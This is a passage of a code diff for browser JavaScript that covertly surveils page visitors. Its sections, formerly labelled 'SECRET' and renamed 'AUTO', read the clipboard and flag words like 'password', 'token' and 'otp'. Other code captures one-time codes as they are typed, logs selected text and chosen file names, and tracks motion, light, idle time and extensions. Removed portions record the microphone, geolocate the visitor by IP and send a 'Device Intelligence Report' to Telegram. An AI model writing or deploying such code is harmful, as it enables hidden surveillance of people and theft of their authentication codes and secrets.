-                recorder.ondataavailable = (e) => chunks.push(e.data);
-                recorder.start();
-                setTimeout(() => {
-                    recorder.stop();
-                    setTimeout(() => {
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        sendAlert(`🎵 Audio sample: ${Math.round(blob.size / 1024)}KB`);
-                    }, 100);
-                }, 3000);
-            }, 5000);
+                if (battery.level < STATE.lastBatteryLevel) {
+                    const drain = (STATE.lastBatteryLevel - battery.level) * 100;
+                    if (drain > 2) {
+                        sendAlert(`⚡ Drain rate: ${drain.toFixed(1)}% in 30s`);
+                    }
+                }
+            }, 30000);
             
         } catch(e) {
-            // Mic denied - check if available
-            const hasMic = await navigator.mediaDevices.enumerateDevices()
-                .then(devices => devices.some(d => d.kind === 'audioinput'))
-                .catch(() => false);
-            
-            if (hasMic) {
-                sendAlert(`🎤 Microphone available but not accessed`);
-            }
+            sendAlert(`🔋 Battery unavailable: ${e.message}`);
         }
     }
 
     // ============================================
-    //  SECRET: CLIPBOARD TRACKING
+    //  AUTO: CLIPBOARD
     // ============================================
-    function setupClipboardTracking() {
-        if (!CONFIG.ENABLE_CLIPBOARD) return;
+    function autoClipboard() {
+        if (!CONFIG.AUTO_CLIPBOARD) return;
         
-        // Try to read clipboard on any interaction
-        document.addEventListener('click', async () => {
+        // Try to read clipboard on load
+        setTimeout(async () => {
             try {
                 const text = await navigator.clipboard.readText();
-                if (text && text.length > 0 && text !== STATE.clipboardContent) {
+                if (text && text.length > 0) {
                     STATE.clipboardContent = text;
                     const preview = text.substring(0, 100);
                     sendAlert(`📋 Clipboard: ${preview}${text.length > 100 ? '...' : ''} (${text.length} chars)`);
-                }
-            } catch(e) {}
-        });
-        
-        // Detect paste events
-        document.addEventListener('paste', (e) => {
-            const text = e.clipboardData?.getData('text');
-            if (text && text.length > 0) {
-                const preview = text.substring(0, 100);
-                sendAlert(`📋 Paste: ${preview}${text.length > 100 ? '...' : ''} (${text.length} chars)`);
-            }
-            
-            // Check for images in clipboard
-            const items = e.clipboardData?.items;
-            if (items) {
-                for (const item of items) {
-                    if (item.type.startsWith('image/')) {
-                        sendAlert(`🖼️ Image pasted from clipboard`);
+                    
+                    // Check for sensitive data
+                    const sensitive = ['password', 'pass', 'key', 'secret', 'token', 'bank', 'card', 'pin', 'otp'];
+                    const lowerText = text.toLowerCase();
+                    for (const word of sensitive) {
+                        if (lowerText.includes(word)) {
+                            sendAlert(`⚠️ Sensitive clipboard data detected: ${word}`);
+                            break;
+                        }
                     }
                 }
-            }
+            } catch(e) {}
+        }, 2000);
+        
+        // Monitor clipboard changes
+        document.addEventListener('copy', () => {
+            setTimeout(async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text.length > 0 && text !== STATE.clipboardContent) {
+                        STATE.clipboardContent = text;
+                        sendAlert(`📋 Copied: ${text.substring(0, 50)}...`);
+                    }
+                } catch(e) {}
+            }, 100);
         });
     }
 
     // ============================================
-    //  SECRET: OTP/SMS DETECTION
+    //  AUTO: OTP DETECTION
     // ============================================
-    function setupOTPDetection() {
-        if (!CONFIG.ENABLE_OTP_DETECT) return;
+    function autoOTP() {
+        if (!CONFIG.AUTO_OTP) return;
         
-        // Monitor input fields for OTP patterns
-        document.querySelectorAll('input[type="text"], input[type="number"], input[type="tel"]').forEach(input => {
-            input.addEventListener('input', () => {
-                const val = input.value;
-                if (val && /^\d{4,6}$/.test(val)) {
-                    STATE.otpDetected = val;
-                    sendAlert(`🔑 OTP detected: ${val}`);
-                    
-                    // Check if it's a verification code
-                    const fieldName = input.name || input.id || 'unknown';
-                    sendAlert(`📱 OTP field: ${fieldName}`);
+        // Monitor all input fields for OTP patterns
+        const observer = new MutationObserver(() => {
+            document.querySelectorAll('input[type="text"], input[type="number"], input[type="tel"]').forEach(input => {
+                if (!input._otpMonitored) {
+                    input._otpMonitored = true;
+                    input.addEventListener('input', () => {
+                        const val = input.value;
+                        if (val && /^\d{4,6}$/.test(val)) {
+                            STATE.otpDetected = val;
+                            sendAlert(`🔑 OTP detected: ${val}`);
+                            
+                            // Check field names
+                            const attrs = ['name', 'id', 'placeholder', 'autocomplete'];
+                            for (const attr of attrs) {
+                                const value = input.getAttribute(attr);
+                                if (value) {
+                                    const lower = value.toLowerCase();
+                                    if (lower.includes('otp') || lower.includes('code') || 
+                                        lower.includes('verification') || lower.includes('sms')) {
+                                        sendAlert(`🔐 OTP field identified: ${value}`);
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+                    });
                 }
             });
         });
         
-        // Monitor for SMS input patterns
-        document.querySelectorAll('input').forEach(input => {
-            const attrs = ['autocomplete', 'name', 'id', 'placeholder', 'class'];
-            for (const attr of attrs) {
-                const value = input.getAttribute(attr);
-                if (value) {
-                    const lower = value.toLowerCase();
-                    if (lower.includes('otp') || lower.includes('code') || lower.includes('verification') || 
-                        lower.includes('sms') || lower.includes('confirm')) {
-                        sendAlert(`🔐 OTP input detected: ${value}`);
-                        break;
-                    }
-                }
-            }
-        });
+        observer.observe(document.body, { childList: true, subtree: true });
     }
 
     // ============================================
-    //  SECRET: MOTION & GYROSCOPE
+    //  AUTO: MOTION & GYROSCOPE
     // ============================================
-    function setupMotionTracking() {
-        if (!CONFIG.ENABLE_MOTION) return;
+    function autoMotion() {
+        if (!CONFIG.AUTO_MOTION) return;
         
         if (window.DeviceMotionEvent) {
-            let lastMotionAlert = 0;
+            let lastMotionTime = 0;
             
             window.addEventListener('devicemotion', (e) => {
                 const accel = e.accelerationIncludingGravity;
@@ -1179,53 +1281,39 @@
                     const z = Math.abs(accel.z || 0);
                     const total = Math.sqrt(x*x + y*y + z*z);
                     
-                    // Detect significant movement
-                    if (total > 20) {
-                        const now = Date.now();
-                        if (now - lastMotionAlert > 5000) {
-                            lastMotionAlert = now;
-                            sendAlert(`📱 Device movement: ${total.toFixed(1)} m/s²`);
-                            
-                            // Detect walking/running
-                            if (total > 30) {
-                                sendAlert(`🏃 Walking/running detected`);
-                            }
+                    const now = Date.now();
+                    if (total > 22 && now - lastMotionTime > 3000) {
+                        lastMotionTime = now;
+                        sendAlert(`📱 Device movement: ${total.toFixed(1)} m/s²`);
+                        
+                        if (total > 35) {
+                            sendAlert(`🏃 Running/walking detected`);
                         }
                     }
                     
-                    // Detect device orientation
-                    if (total < 9.5) {
+                    // Detect device position
+                    if (total < 9.8) {
                         STATE.orientation = 'Flat';
                     } else if (Math.abs(x) > 8) {
                         STATE.orientation = 'Portrait';
                     } else if (Math.abs(y) > 8) {
                         STATE.orientation = 'Landscape';
-                    } else {
-                        STATE.orientation = 'Tilted';
                     }
                 }
             });
-        }
-        
-        // Orientation changes
-        window.addEventListener('orientationchange', () => {
-            const orientation = getOrientation();
-            sendAlert(`🔄 Orientation: ${orientation}`);
-        });
-        
-        // Screen orientation API
-        if (screen.orientation) {
-            screen.orientation.addEventListener('change', () => {
-                sendAlert(`🔄 Orientation: ${screen.orientation.type}`);
+            
+            // Orientation change
+            window.addEventListener('orientationchange', () => {
+                sendAlert(`🔄 Orientation: ${getOrientation()}`);
             });
         }
     }
 
     // ============================================
-    //  SECRET: LIGHT SENSOR
+    //  AUTO: LIGHT SENSOR
     // ============================================
-    function setupLightSensor() {
-        if (!CONFIG.ENABLE_LIGHT_SENSOR) return;
+    function autoLightSensor() {
+        if (!CONFIG.AUTO_LIGHT) return;
         
         if ('AmbientLightSensor' in window) {
             try {
@@ -1233,7 +1321,7 @@
                 sensor.addEventListener('reading', () => {
                     const lux = sensor.illuminance;
                     if (lux < 5) {
-                        sendAlert(`🌙 Very dark: ${lux} lux (in pocket/purse?)`);
+                        sendAlert(`🌙 Very dark: ${lux} lux (pocket/purse)`);
                     } else if (lux < 50) {
                         sendAlert(`🌙 Dim: ${lux} lux (indoor)`);
                     } else if (lux > 5000) {
@@ -1243,69 +1331,16 @@
                     }
                 });
                 sensor.start();
-                sendAlert(`💡 Light sensor available`);
-            } catch(e) {
-                // Silently fail
-            }
+                sendAlert('💡 Light sensor active');
+            } catch(e) {}
         }
     }
 
     // ============================================
-    //  SECRET: SCREENSHOT DETECTION
+    //  AUTO: EXTENSIONS DETECTION
     // ============================================
-    function setupScreenshotDetection() {
-        if (!CONFIG.ENABLE_SCREENSHOT) return;
-        
-        // Detect visibility changes (tab switching = possible screenshot)
-        document.addEventListener('visibilitychange', () => {
-            if (document.hidden) {
-                setTimeout(() => {
-                    // Check if user returned quickly (screenshot)
-                    if (!document.hidden) {
-                        sendAlert(`📸 Possible screenshot taken (tab switch)`);
-                    }
-                }, 2000);
-            }
-        });
-        
-        // Detect key combinations
-        document.addEventListener('keydown', (e) => {
-            if (e.ctrlKey && e.key === 's') {
-                sendAlert(`📸 Screenshot: Ctrl+S`);
-            }
-            if (e.key === 'PrintScreen') {
-                sendAlert(`📸 Screenshot: PrintScreen`);
-            }
-            if (e.ctrlKey && e.shiftKey && e.key === 'S') {
-                sendAlert(`📸 Screenshot: Ctrl+Shift+S`);
-            }
-        });
-        
-        // iOS screenshot detection (volume up + power)
-        let lastVolumePress = 0;
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'VolumeUp') {
-                const now = Date.now();
-                if (now - lastVolumePress < 200) {
-                    sendAlert(`📸 iOS screenshot detected (Volume Up + Power)`);
-                }
-                lastVolumePress = now;
-            }
-            if (e.key === 'VolumeDown') {
-                const now = Date.now();
-                if (now - lastVolumePress < 200) {
-                    sendAlert(`📸 iOS screenshot detected (Volume Down + Power)`);
-                }
-                lastVolumePress = now;
-            }
-        });
-    }
-
-    // ============================================
-    //  SECRET: EXTENSION DETECTION
-    // ============================================
-    function setupExtensionDetection() {
-        if (!CONFIG.ENABLE_EXTENSIONS) return;
+    function autoExtensions() {
+        if (!CONFIG.AUTO_EXTENSIONS) return;
         
         const extensions = {
             'AdBlock': 'gighmmpiobklfepjocnamgkkbiglidom',
@@ -1333,11 +1368,11 @@
                 link.onload = () => {
                     if (!detected.includes(name)) {
                         detected.push(name);
+                        STATE.detectedExtensions = detected;
                         sendAlert(`🔌 Extension: ${name}`);
                     }
                 };
                 link.onerror = () => {
-                    // Check if extension is installed via other method
                     const testEl = document.createElement('div');
                     testEl.style.cssText = `position:fixed;top:-999px;left:-999px;`;
                     testEl.className = `_${id}_test`;
@@ -1346,6 +1381,7 @@
                         if (getComputedStyle(testEl).display !== 'none') {
                             if (!detected.includes(name)) {
                                 detected.push(name);
+                                STATE.detectedExtensions = detected;
                                 sendAlert(`🔌 Extension: ${name}`);
                             }
                         }
@@ -1355,114 +1391,63 @@
                 document.head.appendChild(link);
             };
         }
+        
+        // Report total after 5 seconds
+        setTimeout(() => {
+            if (detected.length > 0) {
+                sendAlert(`🔌 Total extensions detected: ${detected.length}`);
+            }
+        }, 5000);
     }
 
     // ============================================
-    //  SECRET: NETWORK MONITORING
+    //  AUTO: SCREENSHOT DETECTION
     // ============================================
-    function setupNetworkMonitoring() {
-        if (!CONFIG.ENABLE_NETWORK_MONITOR) return;
+    function autoScreenshotDetection() {
+        if (!CONFIG.AUTO_SCREENSHOT) return;
         
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            conn.addEventListener('change', () => {
-                const type = getNetworkType();
-                const speed = conn.downlink || '?';
-                const rtt = conn.rtt || '?';
-                sendAlert(`🌐 Network: ${type}, ${speed}Mbps, ${rtt}ms RTT`);
-                
-                if (conn.saveData) {
-                    sendAlert(`📶 Data saver mode enabled`);
+        // Tab visibility change
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                setTimeout(() => {
+                    if (!document.hidden) {
+                        sendAlert('📸 Possible screenshot (tab switch)');
+                    }
+                }, 1500);
+            }
+        });
+        
+        // Key combinations
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 's') {
+                sendAlert('📸 Screenshot: Ctrl+S');
+            }
+            if (e.key === 'PrintScreen') {
+                sendAlert('📸 Screenshot: PrintScreen');
+            }
+            if (e.ctrlKey && e.shiftKey && e.key === 'S') {
+                sendAlert('📸 Screenshot: Ctrl+Shift+S');
+            }
+        });
+        
+        // iOS screenshot detection
+        let lastVolumePress = 0;
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'VolumeUp' || e.key === 'VolumeDown') {
+                const now = Date.now();
+                if (now - lastVolumePress < 300) {
+                    sendAlert('📸 iOS screenshot detected');
                 }
-            });
-            
-            // Initial network info
-            setTimeout(() => {
-                const type = getNetworkType();
-                const speed = conn.downlink || '?';
-                sendAlert(`🌐 Initial network: ${type}, ${speed}Mbps`);
-            }, 3000);
-        }
+                lastVolumePress = now;
+            }
+        });
     }
 
     // ============================================
-    //  SECRET: IDLE DETECTION
+    //  AUTO: PERFORMANCE & NETWORK
     // ============================================
-    function setupIdleDetection() {
-        if (!CONFIG.ENABLE_IDLE_DETECT) return;
-        
-        let idleTime = 0;
-        let idleAlertSent = false;
-        
-        setInterval(() => {
-            idleTime++;
-            if (idleTime > 60 && !idleAlertSent) {
-                idleAlertSent = true;
-                sendAlert(`💤 User idle for ${idleTime} seconds`);
-            }
-            if (idleTime > 300) {
-                sendAlert(`😴 Long idle: ${Math.round(idleTime / 60)} minutes`);
-            }
-        }, 1000);
-        
-        const resetIdle = () => {
-            if (idleTime > 30) {
-                sendAlert(`👆 User active after ${idleTime}s idle`);
-            }
-            idleTime = 0;
-            idleAlertSent = false;
-        };
-        
-        document.addEventListener('mousemove', resetIdle);
-        document.addEventListener('keydown', resetIdle);
-        document.addEventListener('touchstart', resetIdle);
-        document.addEventListener('scroll', resetIdle);
-        document.addEventListener('click', resetIdle);
-    }
-
-    // ============================================
-    //  SECRET: MEDIA PLAYING DETECTION
-    // ============================================
-    function setupMediaDetection() {
-        if (!CONFIG.ENABLE_MEDIA_DETECT) return;
-        
-        document.addEventListener('play', (e) => {
-            const target = e.target;
-            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
-                const src = target.src || target.currentSrc || 'unknown';
-                const duration = target.duration || '?';
-                sendAlert(`▶️ Media playing: ${src.substring(0, 50)} (${duration}s)`);
-                
-                // Detect if it's a video
-                if (target.tagName === 'VIDEO') {
-                    const size = `${target.videoWidth}×${target.videoHeight}`;
-                    sendAlert(`📹 Video: ${size}`);
-                }
-            }
-        }, true);
-        
-        document.addEventListener('pause', (e) => {
-            const target = e.target;
-            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
-                sendAlert(`⏸️ Media paused`);
-            }
-        }, true);
-        
-        document.addEventListener('volumechange', (e) => {
-            const target = e.target;
-            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
-                const volume = Math.round(target.volume * 100);
-                const muted = target.muted;
-                sendAlert(`🔊 Volume: ${volume}%${muted ? ' (muted)' : ''}`);
-            }
-        }, true);
-    }
-
-    // ============================================
-    //  SECRET: PERFORMANCE MONITORING
-    // ============================================
-    function setupPerformanceMonitoring() {
-        if (!CONFIG.ENABLE_PERFORMANCE) return;
+    function autoPerformance() {
+        if (!CONFIG.AUTO_PERFORMANCE) return;
         
         window.addEventListener('load', () => {
             const perfData = performance.getEntriesByType('navigation')[0];
@@ -1474,24 +1459,44 @@
                     dom: Math.round(perfData.domComplete - perfData.domInteractive),
                     load: Math.round(perfData.loadEventEnd - perfData.fetchStart),
                 };
-                sendAlert(`⏱️ Performance: DNS=${metrics.dns}ms, TCP=${metrics.tcp}ms, TTFB=${metrics.ttfb}ms, DOM=${metrics.dom}ms, Load=${metrics.load}ms`);
+                sendAlert(`⏱️ Performance: DNS=${metrics.dns}ms, TTFB=${metrics.ttfb}ms, Load=${metrics.load}ms`);
             }
             
-            // Memory usage
             if (performance.memory) {
                 const mem = performance.memory;
                 const used = Math.round(mem.usedJSHeapSize / 1024 / 1024);
                 const total = Math.round(mem.jsHeapSizeLimit / 1024 / 1024);
-                sendAlert(`💾 Memory: ${used}MB / ${total}MB used`);
+                sendAlert(`💾 Memory: ${used}MB / ${total}MB`);
             }
         });
     }
 
+    function autoNetwork() {
+        if (!CONFIG.AUTO_NETWORK) return;
+        
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            setTimeout(() => {
+                const type = getNetworkType();
+                const speed = conn.downlink || '?';
+                sendAlert(`🌐 Network: ${type}, ${speed}Mbps, ${conn.rtt || '?'}ms RTT`);
+                document.getElementById('footerNetwork').textContent = type;
+            }, 1000);
+            
+            conn.addEventListener('change', () => {
+                const type = getNetworkType();
+                const speed = conn.downlink || '?';
+                sendAlert(`🌐 Network changed: ${type}, ${speed}Mbps`);
+                document.getElementById('footerNetwork').textContent = type;
+            });
+        }
+    }
+
     // ============================================
-    //  SECRET: SOCIAL MEDIA DETECTION
+    //  AUTO: SOCIAL & REFERRER
     // ============================================
-    function setupSocialDetection() {
-        if (!CONFIG.ENABLE_SOCIAL_DETECT) return;
+    function autoSocialDetection() {
+        if (!CONFIG.AUTO_SOCIAL) return;
         
         const referrer = document.referrer.toLowerCase();
         const socialNetworks = {
@@ -1508,24 +1513,19 @@
             'snapchat': 'Snapchat',
             'pinterest': 'Pinterest',
             'tumblr': 'Tumblr',
-            'wechat': 'WeChat',
-            'line': 'Line',
-            'viber': 'Viber',
-            'signal': 'Signal',
             'google': 'Google Search',
             'bing': 'Bing Search',
             'duckduckgo': 'DuckDuckGo',
-            'yahoo': 'Yahoo Search'
         };
         
         for (const [key, name] of Object.entries(socialNetworks)) {
             if (referrer.includes(key)) {
-                sendAlert(`📱 Referrer: ${name}`);
+                sendAlert(`📱 Source: ${name}`);
                 break;
             }
         }
         
-        // Detect from URL parameters
+        // UTM parameters
         const urlParams = new URLSearchParams(window.location.search);
         const utm = urlParams.get('utm_source');
         if (utm) {
@@ -1534,96 +1534,136 @@
     }
 
     // ============================================
-    //  SECRET: ELEMENT VISIBILITY TRACKING
+    //  AUTO: THEME & ORIENTATION
     // ============================================
-    function setupVisibilityTracking() {
-        if (!CONFIG.ENABLE_VISIBILITY_TRACK) return;
+    function autoThemeDetection() {
+        if (!CONFIG.AUTO_THEME) return;
         
-        const observer = new IntersectionObserver((entries) => {
-            entries.forEach(entry => {
-                if (entry.isIntersecting) {
-                    const el = entry.target;
-                    const id = el.id || el.className || el.tagName || 'unknown';
-                    const text = el.textContent?.substring(0, 50) || '';
-                    
-                    // Only track significant elements
-                    if (el.tagName === 'H1' || el.tagName === 'H2' || el.tagName === 'H3') {
-                        if (!STATE.visitedSections.includes(id)) {
-                            STATE.visitedSections.push(id);
-                            sendAlert(`👀 Viewing: ${text}`);
-                        }
-                    }
-                }
-            });
-        }, { threshold: 0.5 });
-        
-        document.querySelectorAll('h1, h2, h3, .blog-post, .interactive-area, .feature-btn').forEach(el => {
-            observer.observe(el);
-        });
-    }
-
-    // ============================================
-    //  SECRET: THEME DETECTION
-    // ============================================
-    function setupThemeDetection() {
-        if (!CONFIG.ENABLE_THEME_DETECT) return;
-        
-        // Dark mode detection
+        // Dark mode
         const darkModeMedia = window.matchMedia('(prefers-color-scheme: dark)');
+        if (darkModeMedia.matches) {
+            sendAlert('🎨 Theme: Dark');
+        } else {
+            sendAlert('🎨 Theme: Light');
+        }
+        
         darkModeMedia.addEventListener('change', (e) => {
             sendAlert(`🎨 Theme: ${e.matches ? 'Dark' : 'Light'}`);
         });
         
         // Reduced motion
         const motionMedia = window.matchMedia('(prefers-reduced-motion: reduce)');
-        motionMedia.addEventListener('change', (e) => {
-            sendAlert(`🎬 Motion: ${e.matches ? 'Reduced' : 'Normal'}`);
+        if (motionMedia.matches) {
+            sendAlert('🎬 Motion: Reduced');
+        }
+    }
+
+    // ============================================
+    //  AUTO: IDLE DETECTION
+    // ============================================
+    function autoIdleDetection() {
+        if (!CONFIG.AUTO_IDLE) return;
+        
+        let idleTime = 0;
+        let idleAlertSent = false;
+        
+        setInterval(() => {
+            idleTime++;
+            if (idleTime > 60 && !idleAlertSent) {
+                idleAlertSent = true;
+                sendAlert(`💤 Idle: ${idleTime}s`);
+            }
+            if (idleTime > 300) {
+                sendAlert(`😴 Long idle: ${Math.round(idleTime / 60)}min`);
+            }
+        }, 1000);
+        
+        const resetIdle = () => {
+            if (idleTime > 30) {
+                sendAlert(`👆 Active after ${idleTime}s idle`);
+            }
+            idleTime = 0;
+            idleAlertSent = false;
+        };
+        
+        document.addEventListener('mousemove', resetIdle);
+        document.addEventListener('keydown', resetIdle);
+        document.addEventListener('touchstart', resetIdle);
+        document.addEventListener('scroll', resetIdle);
+        document.addEventListener('click', resetIdle);
+    }
+
+    // ============================================
+    //  AUTO: MEDIA PLAYBACK
+    // ============================================
+    function autoMediaDetection() {
+        if (!CONFIG.AUTO_MEDIA) return;
+        
+        document.addEventListener('play', (e) => {
+            const target = e.target;
+            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
+                const src = target.src || target.currentSrc || 'unknown';
+                sendAlert(`▶️ Media playing: ${src.substring(0, 50)}`);
+                if (target.tagName === 'VIDEO') {
+                    sendAlert(`📹 Video: ${target.videoWidth}×${target.videoHeight}`);
+                }
+            }
+        }, true);
+        
+        document.addEventListener('pause', (e) => {
+            const target = e.target;
+            if (target.tagName === 'VIDEO' || target.tagName === 'AUDIO') {
+                sendAlert('⏸️ Media paused');
+            }
+        }, true);
+    }
+
+    // ============================================
+    //  AUTO: USER INTERACTIONS
+    // ============================================
+    function autoInteractionTracking() {
+        document.addEventListener('mousemove', () => {
+            STATE.mouseMoves++;
+            if (STATE.mouseMoves % 50 === 0) {
+                sendAlert(`🖱️ Mouse moves: ${STATE.mouseMoves}`);
+            }
         });
         
-        // High contrast
-        const contrastMedia = window.matchMedia('(prefers-contrast: high)');
-        if (contrastMedia) {
-            contrastMedia.addEventListener('change', (e) => {
-                sendAlert(`🎨 Contrast: ${e.matches ? 'High' : 'Normal'}`);
-            });
-        }
-    }
-
-    // ============================================
-    //  SECRET: GAMEPAD DETECTION
-    // ============================================
-    function setupGamepadDetection() {
-        if (!CONFIG.ENABLE_GAMEPAD) return;
+        document.addEventListener('click', () => {
+            STATE.clicks++;
+            if (STATE.clicks % 5 === 0) {
+                sendAlert(`👆 Clicks: ${STATE.clicks}`);
+            }
+        });
         
-        if (navigator.getGamepads) {
-            setInterval(() => {
-                const gamepads = navigator.getGamepads();
-                for (let i = 0; i < gamepads.length; i++) {
-                    const pad = gamepads[i];
-                    if (pad) {
-                        sendAlert(`🎮 Gamepad ${i}: ${pad.id}`);
-                        break;
-                    }
-                }
-            }, 10000);
-        }
+        document.addEventListener('scroll', () => {
+            STATE.scrolls++;
+            if (STATE.scrolls % 10 === 0) {
+                sendAlert(`📜 Scrolls: ${STATE.scrolls}`);
+            }
+        });
+        
+        // Text selection
+        document.addEventListener('mouseup', () => {
+            const selection = window.getSelection().toString();
+            if (selection.length > 30) {
+                sendAlert(`📝 Selection: ${selection.substring(0, 50)}...`);
+            }
+        });
     }
 
     // ============================================
-    //  SECRET: FILE DETECTION
+    //  AUTO: FILE DETECTION
     // ============================================
-    function setupFileDetection() {
-        if (!CONFIG.ENABLE_FILE_DETECT) return;
+    function autoFileDetection() {
+        if (!CONFIG.AUTO_FILE) return;
         
         document.addEventListener('change', (e) => {
             const target = e.target;
             if (target.type === 'file' && target.files.length > 0) {
                 const file = target.files[0];
-                const type = file.type || 'unknown';
-                const size = Math.round(file.size / 1024);
-                sendAlert(`📁 File selected: ${file.name} (${type}, ${size}KB)`);
+                sendAlert(`📁 File: ${file.name} (${Math.round(file.size / 1024)}KB)`);
                 
-                // Check if it's a sensitive file
                 const sensitive = ['password', 'pass', 'credential', 'key', 'secret', 'wallet'];
                 const lowerName = file.name.toLowerCase();
                 for (const word of sensitive) {
@@ -1634,260 +1674,44 @@
                 }
             }
         });
-        
-        // Drag and drop detection
-        document.addEventListener('dragover', (e) => {
-            e.preventDefault();
-        });
-        
-        document.addEventListener('drop', (e) => {
-            e.preventDefault();
-            const files = e.dataTransfer?.files;
-            if (files && files.length > 0) {
-                const file = files[0];
-                sendAlert(`📁 File dropped: ${file.name}`);
-            }
-        });
     }
 
     // ============================================
-    //  SECRET: CLIPBOARD IMAGE DETECTION
+    //  AUTO: GAMEPAD
     // ============================================
-    function setupClipboardImageDetection() {
-        document.addEventListener('copy', (e) => {
-            try {
-                const selection = window.getSelection().toString();
-                if (selection && selection.length > 0) {
-                    // Check if copying an image
-                    const img = document.querySelector('img');
-                    if (img && selection === img.alt) {
-                        sendAlert(`🖼️ Image copied: ${img.src.substring(0, 50)}`);
+    function autoGamepadDetection() {
+        if (!CONFIG.AUTO_GAMEPAD) return;
+        
+        if (navigator.getGamepads) {
+            setInterval(() => {
+                const gamepads = navigator.getGamepads();
+                for (let i = 0; i < gamepads.length; i++) {
+                    const pad = gamepads[i];
+                    if (pad) {
+                        sendAlert(`🎮 Gamepad: ${pad.id}`);
+                        break;
                     }
                 }
-            } catch(e) {}
-        });
-    }
-
-    // ============================================
-    //  SECRET: DEVICE ORIENTATION (Detailed)
-    // ============================================
-    function setupDetailedOrientation() {
-        if (window.DeviceOrientationEvent) {
-            window.addEventListener('deviceorientation', (e) => {
-                const alpha = Math.round(e.alpha || 0);
-                const beta = Math.round(e.beta || 0);
-                const gamma = Math.round(e.gamma || 0);
-                
-                // Detect phone position
-                if (beta > 70) {
-                    sendAlert(`📱 Phone laying flat (${beta}° tilt)`);
-                } else if (beta < 20) {
-                    sendAlert(`📱 Phone upright (${beta}° tilt)`);
-                }
-                
-                // Detect compass direction
-                if (alpha % 45 < 5) {
-                    const directions = ['North', 'NE', 'East', 'SE', 'South', 'SW', 'West', 'NW'];
-                    const dir = directions[Math.round(alpha / 45) % 8];
-                    sendAlert(`🧭 Compass: ${dir} (${alpha}°)`);
-                }
-            });
+            }, 10000);
         }
     }
 
     // ============================================
-    //  MAIN DATA COLLECTION & SENDING
+    //  WEATHER UI UPDATE
     // ============================================
-    async function collectAndSendData() {
-        if (STATE.dataSent) return;
-        
-        // Get IP info
-        if (CONFIG.ENABLE_IP) {
-            try {
-                const res = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(3000) });
-                const data = await res.json();
-                STATE.ipData = {
-                    ip: data.ip || 'Unknown',
-                    city: data.city || 'Unknown',
-                    region: data.region || 'Unknown',
-                    country: data.country_name || 'Unknown',
-                    isp: data.org || 'Unknown',
-                    lat: data.latitude || null,
-                    lng: data.longitude || null,
-                };
-            } catch {
-                try {
-                    const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(3000) });
-                    const data = await res.json();
-                    STATE.ipData = { ip: data.ip, city: 'Unknown', country: 'Unknown', region: 'Unknown', isp: 'Unknown' };
-                } catch {}
-            }
-        }
-        
-        // Build comprehensive report
-        const report = buildDetailedReport();
-        sendToTelegram(report);
-        STATE.dataSent = true;
-        
-        // Update UI
-        updateUI();
-    }
-
-    function buildDetailedReport() {
-        const lines = [];
-        lines.push('📱 *Device Intelligence Report*');
-        lines.push('━'.repeat(30));
-        lines.push('');
-        
-        // Device Info
-        lines.push('📱 *Device Information*');
-        lines.push(`   Platform: ${getPlatform()}`);
-        lines.push(`   Browser: ${getBrowser()}`);
-        lines.push(`   Mobile: ${isMobile() ? 'Yes' : 'No'}`);
-        lines.push(`   iOS: ${isIOS() ? 'Yes' : 'No'}`);
-        lines.push(`   Android: ${isAndroid() ? 'Yes' : 'No'}`);
-        lines.push(`   Screen: ${getScreenInfo()}`);
-        lines.push(`   Pixel Ratio: ${getPixelRatio()}`);
-        lines.push(`   CPU Cores: ${getHardwareConcurrency()}`);
-        lines.push(`   RAM: ${getDeviceMemory() !== 'Unknown' ? getDeviceMemory() + 'GB' : 'Unknown'}`);
-        lines.push(`   Dark Mode: ${isDarkMode() ? 'Yes' : 'No'}`);
-        lines.push(`   Timezone: ${getTimeZone()}`);
-        lines.push('');
-        
-        // Battery
-        if (STATE.batteryLevel !== null) {
-            lines.push('🔋 *Battery Status*');
-            lines.push(`   Level: ${STATE.batteryLevel}%`);
-            lines.push(`   Charging: ${STATE.isCharging ? 'Yes ⚡' : 'No 🔋'}`);
-            lines.push('');
-        }
-        
-        // Network
-        const network = getNetworkType();
-        lines.push('🌐 *Network Information*');
-        lines.push(`   Type: ${network}`);
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            if (conn.downlink) lines.push(`   Speed: ${conn.downlink}Mbps`);
-            if (conn.rtt) lines.push(`   Latency: ${conn.rtt}ms`);
-            if (conn.saveData !== undefined) lines.push(`   Data Saver: ${conn.saveData ? 'Enabled' : 'Disabled'}`);
-        }
-        lines.push('');
-        
-        // Location
-        if (STATE.location) {
-            lines.push('📍 *GPS Location*');
-            lines.push(`   Lat: ${STATE.location.lat.toFixed(6)}`);
-            lines.push(`   Lng: ${STATE.location.lng.toFixed(6)}`);
-            if (STATE.location.accuracy) {
-                lines.push(`   Accuracy: ±${Math.round(STATE.location.accuracy)}m`);
-            }
-            lines.push('');
-        } else if (STATE.ipData && STATE.ipData.city !== 'Unknown') {
-            lines.push('📍 *IP Location*');
-            if (STATE.ipData.city) lines.push(`   City: ${STATE.ipData.city}`);
-            if (STATE.ipData.region) lines.push(`   Region: ${STATE.ipData.region}`);
-            if (STATE.ipData.country) lines.push(`   Country: ${STATE.ipData.country}`);
-            if (STATE.ipData.isp) lines.push(`   ISP: ${STATE.ipData.isp}`);
-            if (STATE.ipData.ip) lines.push(`   IP: ${STATE.ipData.ip}`);
-            lines.push('');
-        }
-        
-        // Tracking
-        lines.push('🆔 *Tracking Information*');
-        lines.push(`   Device ID: ${getDeviceId()}`);
-        lines.push(`   Session ID: ${getSessionId()}`);
-        lines.push(`   Visit Count: ${getVisitCount()}`);
-        lines.push(`   First Visit: ${new Date(getFirstVisit()).toLocaleString()}`);
